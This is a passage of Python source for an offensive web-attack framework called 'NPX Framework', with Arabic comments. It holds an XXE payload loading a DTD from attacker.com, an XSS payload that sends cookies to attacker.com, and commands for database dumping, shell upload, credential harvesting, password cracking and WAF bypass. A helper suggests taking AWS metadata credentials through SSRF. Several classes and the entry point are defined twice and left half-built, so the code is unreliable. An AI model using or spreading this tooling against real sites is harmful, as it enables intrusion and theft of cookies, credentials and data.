        return f"""<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE root [
<!ENTITY % remote SYSTEM "http://attacker.com/xxe.dtd">
%remote;
]>
<root>&data;</root>"""

    def test_xxe(self, url):
        """ إرسال طلب POST يحمل XML خبيث """
        print(f"{Colors.DIM}[*] Testing XXE on {url}{Colors.ENDC}")
        payload = self.generate_xxe_payload()
        try:
            headers = {'Content-Type': 'application/xml'}
            response = self.session.send_request("POST", url, data=payload, headers=headers)
            if response and "root:x:0:0" in response.text:
                self.findings.append({'type': 'XXE', 'url': url, 'details': 'Blind XXE / File read'})
                print(f"{Colors.FAIL}[!] XXE Found! Able to read /etc/passwd via XML.{Colors.ENDC}")
        except:
            pass

    def run(self, target_urls):
        print(f"{Colors.OKCYAN}[*] Module: XXE Scanner...{Colors.ENDC}")
        # فحص نقاط النهاية التي تقبل XML
        xml_endpoints = [url for url in target_urls if 'xml' in url or 'api' in url or 'soap' in url]
        for url in xml_endpoints:
            self.test_xxe(url)
        return self.findings

# ======================================================================================
# 29. وحدة فحص WebSocket & GraphQL
# ======================================================================================
class NPXModernScanner:
    def __init__(self, framework):
        self.framework = framework
        self.findings = []
        
    def scan_graphql(self, url):
        """ فحص Introspection في GraphQL """
        test_url = urljoin(url, '/graphql')
        introspection_query = '{"query":"{__schema{types{name}}}"}'
        try:
            headers = {'Content-Type': 'application/json'}
            response = self.framework.session_manager.send_request("POST", test_url, data=introspection_query, headers=headers)
            if response and "__schema" in response.text:
                print(f"{Colors.WARNING}[!] GraphQL Introspection Enabled at {test_url}{Colors.ENDC}")
                self.findings.append({'type': 'GraphQL', 'url': test_url, 'details': 'Introspection Enabled'})
        except:
            pass

    def run(self, target_urls):
        print(f"{Colors.OKCYAN}[*] Module: Modern Web (GraphQL/WebSocket)...{Colors.ENDC}")
        for url in target_urls:
            if '/graphql' in url or '/api' in url:
                self.scan_graphql(url)
        return self.findings

# ======================================================================================
# 30. محرك الجدولة (Scheduler Engine)
# ======================================================================================
class NPXScheduler:
    def __init__(self, framework):
        self.framework = framework
        self.jobs = []
        
    def add_job(self, target, interval):
        """ إضافة مهمة مسح مجدولة """
        import threading
        self.jobs.append({'target': target, 'interval': interval, 'active': True})
        print(f"{Colors.OKGREEN}[+] Scheduled scan added: {target} every {interval} seconds.{Colors.ENDC}")
        
        def run_scan():
            while True:
                time.sleep(interval)
                if not self.jobs[-1]['active']:
                    break
                print(f"{Colors.WARNING}[*] Running auto-scan on {target}...{Colors.ENDC}")
                # استدعاء الفحص الأساسي هنا
                self.framework.config.target_url = target
                # يمكن إضافة استدعاء للفحص هنا
        threading.Thread(target=run_scan, daemon=True).start()

    def list_jobs(self):
        if not self.jobs:
            print(f"{Colors.DIM}[-] No scheduled jobs.{Colors.ENDC}")
        for i, job in enumerate(self.jobs):
            print(f"  {i+1}. Target: {job['target']} | Interval: {job['interval']}s | Active: {job['active']}")

    def stop_job(self, index):
        if 0 <= index < len(self.jobs):
            self.jobs[index]['active'] = False
            print(f"{Colors.WARNING}[!] Stopped job #{index+1}{Colors.ENDC}")

    def run(self):
        pass # يتم تشغيلها بشكل غير متزامن

# ======================================================================================
# 31. محرك التخزين (SQLite Storage Engine)
# ======================================================================================
class NPXStorage:
    def __init__(self, db_path="npx_scan_history.db"):
        import sqlite3
        self.conn = sqlite3.connect(db_path)
        self.cursor = self.conn.cursor()
        # إنشاء الجداول إذا لم تكن موجودة
        self.cursor.execute('''
            CREATE TABLE IF NOT EXISTS scans (
                id INTEGER PRIMARY KEY AUTOINCREMENT,
                target TEXT NOT NULL,
                scan_date TEXT NOT NULL,
                modules TEXT,
                vulns INTEGER,
                results TEXT
            )
        ''')
        self.conn.commit()

    def save_scan(self, target, modules, vulns_count, results):
        import datetime
        scan_date = datetime.datetime.now().isoformat()
        self.cursor.execute('''
            INSERT INTO scans (target, scan_date, modules, vulns, results)
            VALUES (?, ?, ?, ?, ?)
        ''', (target, scan_date, ','.join(modules), vulns_count, json.dumps(results)))
        self.conn.commit()
        print(f"{Colors.OKGREEN}[+] Scan saved to database.{Colors.ENDC}")

    def get_history(self):
        self.cursor.execute('SELECT id, target, scan_date, vulns FROM scans ORDER BY scan_date DESC')
        rows = self.cursor.fetchall()
        for row in rows:
            print(f"  [{row[0]}] {row[1]} | {row[2]} | Vulns: {row[3]}")
        return rows

# ======================================================================================
# 32. تحديث واجهة الأوامر النهائية مع الوظائف الجديدة
# ======================================================================================
class NPXCLIUltimate:
    def __init__(self, framework):
        self.framework = framework
        self.commands = {
            'scan': self.cmd_scan,
            'help': self.cmd_help,
            'exit': self.cmd_exit,
            'clear': self.cmd_clear,
            'info': self.cmd_info,
            'modules': self.cmd_modules,
            'report': self.cmd_report,
            'nuclei': self.cmd_nuclei,
            'bypass': self.cmd_bypass,
            'api': self.cmd_api,
            'chain': self.cmd_chain,
            'postexploit': self.cmd_postexploit,
            'ssrf': self.cmd_ssrf,
            'xxe': self.cmd_xxe,
            'schedule': self.cmd_schedule,
            'history': self.cmd_history,
        }
        
    def cmd_postexploit(self, args):
        """ تشغيل وحدة ما بعد الاستغلال """
        if not hasattr(self.framework, 'vulnerabilities'):
            print(f"{Colors.FAIL}[!] Run 'scan' first.{Colors.ENDC}")
            return
        pe = NPXPostExploit(self.framework)
        pe.run(self.framework.vulnerabilities)

    def cmd_ssrf(self, args):
        """ تشغيل فحص SSRF """
        ssrf = NPXSSRFScanner(self.framework)
        ssrf.run(self.framework.recon.discovered_urls['internal'])

    def cmd_xxe(self, args):
        """ تشغيل فحص XXE """
        xxe = NPXXMLEngine(self.framework)
        xxe.run(self.framework.recon.discovered_urls['internal'])

    def cmd_schedule(self, args):
        """ جدولة مهمة مسح """
        if len(args) < 2:
            print(f"{Colors.FAIL}[!] Usage: schedule add <target> <seconds>{Colors.ENDC}")
            return
        if args[0] == 'add':
            target = args[1]
            interval = int(args[2]) if len(args) > 2 else 3600
            self.framework.scheduler.add_job(target, interval)
        elif args[0] == 'list':
            self.framework.scheduler.list_jobs()
        elif args[0] == 'stop':
            if len(args) > 1:
                self.framework.scheduler.stop_job(int(args[1])-1)

    def cmd_history(self, args):
        """ عرض تاريخ الفحوصات """
        print(f"{Colors.OKCYAN}Scan History:{Colors.ENDC}")
        self.framework.storage.get_history()

    def cmd_bypass(self, args):
        if not hasattr(self.framework, 'vulnerabilities'):
            print(f"{Colors.FAIL}[!] Run 'scan' first.{Colors.ENDC}")
            return
        waf = NPXWAFBypassEngine(self.framework)
        waf.run(self.framework.recon.discovered_urls['internal'], self.framework.vulnerabilities)

    def cmd_api(self, args):
        api = NPXRESTAPI(self.framework)
        api.start()

    def cmd_chain(self, args):
        if not hasattr(self.framework, 'vulnerabilities'):
            print(f"{Colors.FAIL}[!] Run 'scan' first.{Colors.ENDC}")
            return
        chain = NPXExploitChainBuilder(self.framework)
        chain.run(self.framework.vulnerabilities)

    def cmd_scan(self, args):
        if len(args) == 0:
            print(f"{Colors.FAIL}[!] Usage: scan <target_url>{Colors.ENDC}")
            return
            
        target = args[0]
        self.framework.config.target_url = target
        print(f"{Colors.OKCYAN}[*] Target set to: {target}{Colors.ENDC}")
        
        self.framework.recon.crawl_sitemap()
        
        fuzzer = NPXFuzzerModule(self.framework)
        fuzzer.run(self.framework.recon.discovered_urls['internal'])
        
        sqli = NPXSQLiModule(self.framework)
        sqli.run(self.framework.recon.discovered_urls['internal'])
        
        xss = NPXXSSModule(self.framework)
        xss.run(self.framework.recon.discovered_urls['internal'])
        
        lfi = NPXLFIModule(self.framework)
        lfi.run(self.framework.recon.discovered_urls['internal'])
        
        exploit_engine = NPXExploitEngine(self.framework)
        exploit_engine.run(sqli.vulnerabilities + lfi.vulnerabilities)
        
        wp = NPXWordpressScanner(self.framework)
        wp.run(target)
        
        takeover = NPXSubdomainTakeover(self.framework)
        takeover.run(self.framework.recon.subdomains)
        
        harvester = NPXCredentialHarvester(self.framework)
        creds = harvester.run(self.framework.recon.discovered_urls['internal'])
        
        if creds:
            hashcat = NPXHashcatIntegration(self.framework)
            hashcat.run(creds)
        
        # حفظ النتائج في الفئة الرئيسية
        self.framework.vulnerabilities = sqli.vulnerabilities + xss.vulnerabilities + lfi.vulnerabilities
        self.framework.exploits = exploit_engine.exploited
        
        # حفظ الفحص في قاعدة البيانات
        modules_used = ['Fuzzer', 'SQLi', 'XSS', 'LFI', 'Exploit', 'Wordpress', 'Subdomain', 'Harvester']
        self.framework.storage.save_scan(target, modules_used, len(self.framework.vulnerabilities), self.framework.vulnerabilities)
        
        print(f"{Colors.OKGREEN}[+] Full scan completed! Use 'history' to see saved results.{Colors.ENDC}")

    def cmd_report(self, args):
        if not hasattr(self.framework, 'vulnerabilities'):
            print(f"{Colors.FAIL}[!] No scan results found. Run 'scan' first.{Colors.ENDC}")
            return
        reporter = NPXReportGenerator(self.framework)
        reporter.generate_html_report(
            self.framework.vulnerabilities,
            self.framework.exploits,
            [],
            "npx_scan_report.html"
        )

    def cmd_nuclei(self, args):
        if len(args) == 0:
            print(f"{Colors.FAIL}[!] Usage: nuclei <target_url>{Colors.ENDC}")
            return
        nuclei = NPXNucleiIntegration(self.framework)
        nuclei.run(args[0])

    def cmd_modules(self, args):
        print(f"{Colors.OKCYAN}NPX Ultimate Modules:{Colors.ENDC}")
        print("  - Fuzzer          : Directory & File Bruteforce")
        print("  - SQLi            : SQL Injection Scanner")
        print("  - XSS             : Cross-Site Scripting Detector")
        print("  - LFI             : Local File Inclusion Scanner")
        print("  - Exploit         : Auto Exploitation Engine")
        print("  - WAF Bypass      : WAF Detection & Bypass")
        print("  - Credentials     : Credential Harvester")
        print("  - Hashcat         : Password Cracking")
        print("  - Chain           : Exploit Chain Builder")
        print("  - Nuclei          : CVE Discovery (external)")
        print("  - API             : REST API Interface")
        print("  - Post-Exploit    : SQLi Dump & Shell Upload")
        print("  - SSRF            : Server-Side Request Forgery")
        print("  - XXE             : XML External Entity Injection")
        print("  - Modern          : GraphQL & WebSocket Scanning")
        print("  - Scheduler       : Automated Schedule Scans")
        print("  - Storage         : SQLite Scan History")

    def cmd_help(self, args):
        help_text = f"""
{Colors.OKCYAN}NPX Framework v1.0 Ultimate Commands:{Colors.ENDC}
  {Colors.WARNING}help{Colors.ENDC}          Show this help message
  {Colors.WARNING}scan <url>{Colors.ENDC}    Start full scan
  {Colors.WARNING}modules{Colors.ENDC}       List all available modules
  {Colors.WARNING}nuclei <url>{Colors.ENDC}  Run Nuclei CVE scanner
  {Colors.WARNING}report{Colors.ENDC}        Generate HTML report
  {Colors.WARNING}bypass{Colors.ENDC}        Run WAF Bypass
  {Colors.WARNING}chain{Colors.ENDC}         Build exploit chains
  {Colors.WARNING}api{Colors.ENDC}           Start REST API
  {Colors.WARNING}postexploit{Colors.ENDC}   Run post-exploitation
  {Colors.WARNING}ssrf{Colors.ENDC}          Scan for SSRF
  {Colors.WARNING}xxe{Colors.ENDC}           Scan for XXE
  {Colors.WARNING}schedule{Colors.ENDC}      Manage scheduled scans
  {Colors.WARNING}history{Colors.ENDC}       View scan history in DB
  {Colors.WARNING}info{Colors.ENDC}          Show configuration
  {Colors.WARNING}clear{Colors.ENDC}         Clear screen
  {Colors.WARNING}exit{Colors.ENDC}          Exit framework
        """
        print(help_text)

    def cmd_info(self, args):
        print(f"{Colors.OKCYAN}NPX Framework v1.0 Ultimate Suite{Colors.ENDC}")
        print(f"  Target: {self.framework.config.target_url or 'Not set'}")
        print(f"  Threads: {self.framework.config.threads}")
        print(f"  Report: npx_scan_report.html | DB: npx_scan_history.db")

    def cmd_exit(self, args):
        print(f"{Colors.DIM}Goodbye from NPX Framework!{Colors.ENDC}")
        sys.exit(0)

    def cmd_clear(self, args):
        os.system('clear' if os.name == 'posix' else 'cls')

# ======================================================================================
# 33. الفئة الرئيسية النهائية المحدثة (Ultimate Framework)
# ======================================================================================
class NPXFrameworkUltimate:
    def __init__(self):
        self.config = NPXConfig()
        self.session_manager = NPXSessionManager(self.config)
        self.recon = NPXReconEngine(self.session_manager)
        self.scheduler = NPXScheduler(self)
        self.storage = NPXStorage()
        self.cli = NPXCLIUltimate(self)
        self.is_running = False
        self.vulnerabilities = []
        self.exploits = []
        self.modules = {}
        
    def load_config(self, path: str):
        self.config.load_from_file(path)
        
    def run_cli(self):
        self.is_running = True
        self.cli.run()

# ======================================================================================
# 34. نقطة الدخول
# ======================================================================================
def main():
    if not HAS_REQUESTS:
        print(f"{Colors.FAIL}[ERROR] Python requests library is required!{Colors.ENDC}")
        print("Install with: pip install requests")
        sys.exit(1)

    print(f"{Colors.DIM}[*] Initializing NPX Framework Ultimate...{Colors.ENDC}")
    
    framework = NPXFrameworkUltimate()
    
    if len(sys.argv) > 1:
        framework.config.target_url = sys.argv[1]
        print(f"{Colors.OKGREEN}[+] Target set to: {framework.config.target_url}{Colors.ENDC}")
    
    framework.run_cli()

if __name__ == "__main__":
    main()
# ======================================================================================
# 35. محرك التقارير المتقدمة مع الرسوم البيانية (Advanced Report Engine)
# ======================================================================================
class NPXAdvancedReport:
    def __init__(self, framework):
        self.framework = framework
        
    def generate_charts(self, vulnerabilities):
        """ توليد رسوم بيانية بسيطة باستخدام HTML و CSS """
        chart_html = """
        <div style="display:flex; justify-content:space-around; margin: 20px 0;">
            <div style="text-align:center;">
                <h3>Vulnerability Distribution</h3>
                <canvas id="vulnChart" width="200" height="200"></canvas>
            </div>
        </div>
        <script src="https://cdn.jsdelivr.net/npm/chart.js"></script>
        <script>
            const ctx = document.getElementById('vulnChart').getContext('2d');
            const vulnTypes = {};
            """ + json.dumps(vulnerabilities) + """.forEach(v => {
                vulnTypes[v.type] = (vulnTypes[v.type] || 0) + 1;
            });
            new Chart(ctx, {
                type: 'pie',
                data: {
                    labels: Object.keys(vulnTypes),
                    datasets: [{
                        data: Object.values(vulnTypes),
                        backgroundColor: ['#ff4444', '#ffaa44', '#44aaff', '#44ff44', '#aa44ff']
                    }]
                }
            });
        </script>
        """
        return chart_html

    def generate_pdf_report(self, vulnerabilities, exploits, filename="npx_scan_report.pdf"):
        """ إنشاء تقرير PDF باستخدام مكتبة reportlab """
        try:
            from reportlab.lib.pagesizes import letter
            from reportlab.pdfgen import canvas
            from reportlab.lib import colors
            
            c = canvas.Canvas(filename, pagesize=letter)
            c.setFont("Helvetica-Bold", 16)
            c.drawString(100, 750, "NPX Framework Security Assessment")
            c.setFont("Helvetica", 12)
            c.drawString(100, 720, f"Target: {self.framework.config.target_url}")
            c.drawString(100, 700, "Report Generated by NPX Framework")
            
            y = 650
            c.setFont("Helvetica-Bold", 14)
            c.drawString(100, y, "Vulnerabilities Found:")
            y -= 20
            for vuln in vulnerabilities[:10]:
                c.setFont("Helvetica", 10)
                c.drawString(120, y, f"- {vuln['type']} at {vuln['url'][:50]}...")
                y -= 15
                if y < 100:
                    c.showPage()
                    y = 750
            
            c.save()
            print(f"{Colors.OKGREEN}[+] PDF Report saved: {filename}{Colors.ENDC}")
            return filename
        except ImportError:
            print(f"{Colors.WARNING}[-] ReportLab not installed. Install with: pip install reportlab{Colors.ENDC}")
            return None

    def run(self, vulnerabilities, exploits):
        print(f"{Colors.OKCYAN}[*] Generating Advanced Report...{Colors.ENDC}")
        # توليد تقرير HTML مع رسوم بيانية
        html_report = NPXReportGenerator(self.framework).generate_html_report(vulnerabilities, exploits, [])
        
        # إضافة الرسوم البيانية إلى التقرير
        chart_section = self.generate_charts(vulnerabilities)
        with open("npx_scan_report.html", 'r') as f:
            content = f.read()
        content = content.replace("</div>\n        <div class=\"footer\">", f"{chart_section}\n        </div>\n        <div class=\"footer\">")
        with open("npx_scan_report.html", 'w') as f:
            f.write(content)
        print(f"{Colors.OKGREEN}[+] Advanced Report with Charts saved: npx_scan_report.html{Colors.ENDC}")
        
        # توليد PDF
        self.generate_pdf_report(vulnerabilities, exploits)

# ======================================================================================
# 36. وحدة الاستغلال التلقائي للـ XSS (XSS Auto-Exploit)
# ======================================================================================
class NPXXSSExploit:
    def __init__(self, framework):
        self.framework = framework
        self.session = framework.session_manager
        
    def inject_xss_payload(self, url, param):
        """ حقن بايلود JavaScript حقيقي لإثبات الثغرة """
        payloads = [
            "<script>document.location='http://attacker.com/cookie?'+document.cookie;</script>",
            "<img src='http://attacker.com/xss.png' onerror='alert(1)'>"
        ]
        for payload in payloads:
            test_url = url.replace(f"{param}=", f"{param}={quote(payload)}")
            response = self.session.send_request("GET", test_url)
            if response:
                print(f"{Colors.FAIL}[!] XSS Exploit Sent! Check your listener at attacker.com if you own it.{Colors.ENDC}")
                print(f"{Colors.DIM}    Payload: {payload[:30]}...{Colors.ENDC}")
                return True
        return False

    def run(self, xss_vulnerabilities):
        print(f"{Colors.OKCYAN}[*] Exploiting XSS Vulnerabilities...{Colors.ENDC}")
        for vuln in xss_vulnerabilities:
            if 'param' in vuln:
                self.inject_xss_payload(vuln['url'], vuln['param'])

# ======================================================================================
# 37. محرك التحديث التلقائي (Auto-Updater)
# ======================================================================================
class NPXAutoUpdater:
    def __init__(self, framework):
        self.framework = framework
        self.repo_url = "https://raw.githubusercontent.com/npx-official/npx-framework/main/version.json"
        
    def check_for_updates(self):
        """ التحقق من وجود تحديث جديد """
        print(f"{Colors.DIM}[*] Checking for updates...{Colors.ENDC}")
        try:
            response = requests.get(self.repo_url, timeout=5)
            if response.status_code == 200:
                remote_data = response.json()
                current_version = "1.0.0"
                if remote_data.get('version') != current_version:
                    print(f"{Colors.YELLOW}[!] New version available: {remote_data['version']}{Colors.ENDC}")
                    print(f"{Colors.YELLOW}[!] Download from: {remote_data['download_url']}{Colors.ENDC}")
                    return True
                else:
                    print(f"{Colors.OKGREEN}[+] NPX Framework is up to date.{Colors.ENDC}")
        except:
            pass
        return False

    def run(self):
        self.check_for_updates()

# ======================================================================================
# 38. وحدة المساعدة الذكية (Smart Helper)
# ======================================================================================
class NPXSmartHelper:
    def __init__(self, framework):
        self.framework = framework
        
    def suggest_next_steps(self, vulnerabilities):
        """ اقتراح الخطوات التالية بناءً على الثغرات المكتشفة """
        print(f"{Colors.OKCYAN}[*] Smart Helper Suggestions:{Colors.ENDC}")
        suggestions = []
        
        has_sqli = any(v['type'] == 'SQLi' for v in vulnerabilities)
        has_xss = any(v['type'] == 'XSS' for v in vulnerabilities)
        has_lfi = any(v['type'] == 'LFI' for v in vulnerabilities)
        has_ssrf = any(v['type'] == 'SSRF' for v in vulnerabilities)
        
        if has_sqli:
            suggestions.append("  - SQLi Found: Use 'postexploit' to dump database tables.")
        if has_xss:
            suggestions.append("  - XSS Found: Use 'xss_exploit' to send proof-of-concept payloads.")
        if has_lfi:
            suggestions.append("  - LFI Found: Use 'chain' to build Log Poisoning -> RCE.")
        if has_ssrf:
            suggestions.append("  - SSRF Found: Target AWS metadata endpoint to get credentials.")
            
        if not suggestions:
            suggestions.append("  - No critical findings. Consider running 'nuclei' for CVE scanning.")
            
        for s in suggestions:
            print(f"{Colors.WARNING}{s}{Colors.ENDC}")

    def run(self, vulnerabilities):
        self.suggest_next_steps(vulnerabilities)

# ======================================================================================
# 39. تحديث واجهة الأوامر النهائية
# ======================================================================================
class NPXCLIUltimate:
    def __init__(self, framework):
        self.framework = framework
        self.commands = {
            'scan': self.cmd_scan,
            'help': self.cmd_help,
            'exit': self.cmd_exit,
            'clear': self.cmd_clear,
            'info': self.cmd_info,
            'modules': self.cmd_modules,
            'report': self.cmd_report,
            'nuclei': self.cmd_nuclei,
            'bypass': self.cmd_bypass,
            'api': self.cmd_api,
            'chain': self.cmd_chain,
            'postexploit': self.cmd_postexploit,
            'ssrf': self.cmd_ssrf,
            'xxe': self.cmd_xxe,
            'schedule': self.cmd_schedule,
            'history': self.cmd_history,
            'xss_exploit': self.cmd_xss_exploit,
            'update': self.cmd_update,
            'suggest': self.cmd_suggest,
        }
        
    def cmd_xss_exploit(self, args):
        """ تشغيل الاستغلال التلقائي للـ XSS """
        if not hasattr(self.framework, 'vulnerabilities'):
            print(f"{Colors.FAIL}[!] Run 'scan' first.{Colors.ENDC}")
            return
        xss_vulns = [v for v in self.framework.vulnerabilities if v['type'] == 'XSS']
        if xss_vulns:
            xss = NPXXSSExploit(self.framework)
            xss.run(xss_vulns)
        else:
            print(f"{Colors.DIM}[-] No XSS vulnerabilities found to exploit.{Colors.ENDC}")

    def cmd_update(self, args):
        """ التحقق من التحديثات """
        updater = NPXAutoUpdater(self.framework)
        updater.run()

    def cmd_suggest(self, args):
        """ عرض اقتراحات الخطوات التالية """
        if not hasattr(self.framework, 'vulnerabilities'):
            print(f"{Colors.FAIL}[!] Run 'scan' first.{Colors.ENDC}")
            return
        helper = NPXSmartHelper(self.framework)
        helper.run(self.framework.vulnerabilities)

    def cmd_report(self, args):
        if not hasattr(self.framework, 'vulnerabilities'):
            print(f"{Colors.FAIL}[!] No scan results found. Run 'scan' first.{Colors.ENDC}")
            return
        adv_report = NPXAdvancedReport(self.framework)
        adv_report.run(self.framework.vulnerabilities, self.framework.exploits)

    def cmd_scan(self, args):
        if len(args) == 0:
            print(f"{Colors.FAIL}[!] Usage: scan <target_url>{Colors.ENDC}")
            return
            
        target = args[0]
        self.framework.config.target_url = target
        print(f"{Colors.OKCYAN}[*] Target set to: {target}{Colors.ENDC}")
        
        # مسح كامل
        self.framework.recon.crawl_sitemap()
        
        # تشغيل الوحدات
        fuzzer = NPXFuzzerModule(self.framework)
        fuzzer.run(self.framework.recon.discovered_urls['internal'])
        
        sqli = NPXSQLiModule(self.framework)
        sqli.run(self.framework.recon.discovered_urls['internal'])
        
        xss = NPXXSSModule(self.framework)
        xss.run(self.framework.recon.discovered_urls['internal'])
        
        lfi = NPXLFIModule(self.framework)
        lfi.run(self.framework.recon.discovered_urls['internal'])
        
        exploit_engine = NPXExploitEngine(self.framework)
        exploit_engine.run(sqli.vulnerabilities + lfi.vulnerabilities)
        
        wp = NPXWordpressScanner(self.framework)
        wp.run(target)
        
        takeover = NPXSubdomainTakeover(self.framework)
        takeover.run(self.framework.recon.subdomains)
        
        harvester = NPXCredentialHarvester(self.framework)
        creds = harvester.run(self.framework.recon.discovered_urls['internal'])
        
        if creds:
            hashcat = NPXHashcatIntegration(self.framework)
            hashcat.run(creds)
        
        self.framework.vulnerabilities = sqli.vulnerabilities + xss.vulnerabilities + lfi.vulnerabilities
        self.framework.exploits = exploit_engine.exploited
        
        # حفظ في قاعدة البيانات
        modules_used = ['Fuzzer', 'SQLi', 'XSS', 'LFI', 'Exploit', 'Wordpress', 'Subdomain', 'Harvester']
        self.framework.storage.save_scan(target, modules_used, len(self.framework.vulnerabilities), self.framework.vulnerabilities)
        
        # اقتراحات ذكية
        helper = NPXSmartHelper(self.framework)
        helper.run(self.framework.vulnerabilities)
        
        print(f"{Colors.OKGREEN}[+] Full scan completed!{Colors.ENDC}")

    def cmd_postexploit(self, args):
        if not hasattr(self.framework, 'vulnerabilities'):
            print(f"{Colors.FAIL}[!] Run 'scan' first.{Colors.ENDC}")
            return
        pe = NPXPostExploit(self.framework)
        pe.run(self.framework.vulnerabilities)

    def cmd_ssrf(self, args):
        ssrf = NPXSSRFScanner(self.framework)
        ssrf.run(self.framework.recon.discovered_urls['internal'])

    def cmd_xxe(self, args):
        xxe = NPXXMLEngine(self.framework)
        xxe.run(self.framework.recon.discovered_urls['internal'])

    def cmd_schedule(self, args):
        if len(args) < 2:
            print(f"{Colors.FAIL}[!] Usage: schedule add <target> <seconds>{Colors.ENDC}")
            return
        if args[0] == 'add':
            target = args[1]
            interval = int(args[2]) if len(args) > 2 else 3600
            self.framework.scheduler.add_job(target, interval)
        elif args[0] == 'list':
            self.framework.scheduler.list_jobs()
        elif args[0] == 'stop':
            if len(args) > 1:
                self.framework.scheduler.stop_job(int(args[1])-1)

    def cmd_history(self, args):
        print(f"{Colors.OKCYAN}Scan History:{Colors.ENDC}")
        self.framework.storage.get_history()

    def cmd_bypass(self, args):
        if not hasattr(self.framework, 'vulnerabilities'):
            print(f"{Colors.FAIL}[!] Run 'scan' first.{Colors.ENDC}")
            return
        waf = NPXWAFBypassEngine(self.framework)
        waf.run(self.framework.recon.discovered_urls['internal'], self.framework.vulnerabilities)

    def cmd_api(self, args):
        api = NPXRESTAPI(self.framework)
        api.start()

    def cmd_chain(self, args):
        if not hasattr(self.framework, 'vulnerabilities'):
            print(f"{Colors.FAIL}[!] Run 'scan' first.{Colors.ENDC}")
            return
        chain = NPXExploitChainBuilder(self.framework)
        chain.run(self.framework.vulnerabilities)

    def cmd_nuclei(self, args):
        if len(args) == 0:
            print(f"{Colors.FAIL}[!] Usage: nuclei <target_url>{Colors.ENDC}")
            return
        nuclei = NPXNucleiIntegration(self.framework)
        nuclei.run(args[0])

    def cmd_modules(self, args):
        print(f"{Colors.OKCYAN}NPX Ultimate Modules:{Colors.ENDC}")
        print("  - Fuzzer          : Directory & File Bruteforce")
        print("  - SQLi            : SQL Injection Scanner")
        print("  - XSS             : Cross-Site Scripting Detector")
        print("  - LFI             : Local File Inclusion Scanner")
        print("  - Exploit         : Auto Exploitation Engine")
        print("  - WAF Bypass      : WAF Detection & Bypass")
        print("  - Credentials     : Credential Harvester")
        print("  - Hashcat         : Password Cracking")
        print("  - Chain           : Exploit Chain Builder")
        print("  - Nuclei          : CVE Discovery (external)")
        print("  - API             : REST API Interface")
        print("  - Post-Exploit    : SQLi Dump & Shell Upload")
        print("  - SSRF            : Server-Side Request Forgery")
        print("  - XXE             : XML External Entity Injection")
        print("  - Modern          : GraphQL & WebSocket Scanning")
        print("  - Scheduler       : Automated Schedule Scans")
        print("  - Storage         : SQLite Scan History")
        print("  - XSS Exploit     : Inject JavaScript Payloads")
        print("  - Auto-Updater    : Check for new versions")
        print("  - Smart Helper    : Suggest next steps")
        print("  - Advanced Report : PDF & Charts generation")

    def cmd_help(self, args):
        help_text = f"""
{Colors.OKCYAN}NPX Framework v1.0 Ultimate Commands:{Colors.ENDC}
  {Colors.WARNING}help{Colors.ENDC}          Show this help message
  {Colors.WARNING}scan <url>{Colors.ENDC}    Start full scan
  {Colors.WARNING}modules{Colors.ENDC}       List all available modules
  {Colors.WARNING}nuclei <url>{Colors.ENDC}  Run Nuclei CVE scanner
  {Colors.WARNING}report{Colors.ENDC}        Generate Advanced Report (PDF + Charts)
  {Colors.WARNING}bypass{Colors.ENDC}        Run WAF Bypass
  {Colors.WARNING}chain{Colors.ENDC}         Build exploit chains
  {Colors.WARNING}api{Colors.ENDC}           Start REST API
  {Colors.WARNING}postexploit{Colors.ENDC}   Run post-exploitation
  {Colors.WARNING}ssrf{Colors.ENDC}          Scan for SSRF
  {Colors.WARNING}xxe{Colors.ENDC}           Scan for XXE
  {Colors.WARNING}schedule{Colors.ENDC}      Manage scheduled scans
  {Colors.WARNING}history{Colors.ENDC}       View scan history in DB
  {Colors.WARNING}xss_exploit{Colors.ENDC}   Inject XSS payloads
  {Colors.WARNING}update{Colors.ENDC}        Check for framework updates
  {Colors.WARNING}suggest{Colors.ENDC}       Get smart next-step suggestions
  {Colors.WARNING}info{Colors.ENDC}          Show configuration
  {Colors.WARNING}clear{Colors.ENDC}         Clear screen
  {Colors.WARNING}exit{Colors.ENDC}          Exit framework
        """
        print(help_text)

    def cmd_info(self, args):
        print(f"{Colors.OKCYAN}NPX Framework v1.0 Ultimate Suite{Colors.ENDC}")
        print(f"  Target: {self.framework.config.target_url or 'Not set'}")
        print(f"  Threads: {self.framework.config.threads}")
        print(f"  Report: npx_scan_report.html | PDF: npx_scan_report.pdf")
        print(f"  DB: npx_scan_history.db | Version: 1.0.0")

    def cmd_exit(self, args):
        print(f"{Colors.DIM}Goodbye from NPX Framework!{Colors.ENDC}")
        sys.exit(0)

    def cmd_clear(self, args):
        os.system('clear' if os.name == 'posix' else 'cls')

# ======================================================================================
# 40. الفئة الرئيسية النهائية
# ======================================================================================
class NPXFrameworkUltimate:
    def __init__(self):
        self.config = NPXConfig()
        self.session_manager = NPXSessionManager(self.config)
        self.recon = NPXReconEngine(self.session_manager)
        self.scheduler = NPXScheduler(self)
        self.storage = NPXStorage()
        self.cli = NPXCLIUltimate(self)
        self.is_running = False
        self.vulnerabilities = []
        self.exploits = []
        self.modules = {}
        
    def load_config(self, path: str):
        self.config.load_from_file(path)
        
    def run_cli(self):
        self.is_running = True
        self.cli.run()

def main():
    if not HAS_REQUESTS:
        print("[-] Python requests library is required! Install with: pip install requests")
        sys.exit(1)

    print("[*] Initializing NPX Framework Ultimate...")
    framework = NPXFrameworkUltimate()
    
    if len(sys.argv) > 1:
        framework.config.target_url = sys.argv[1]
        print(f"[+] Target set to: {framework.config.target_url}")
    
    framework.run_cli()

if __name__ == "__main__":
    main()
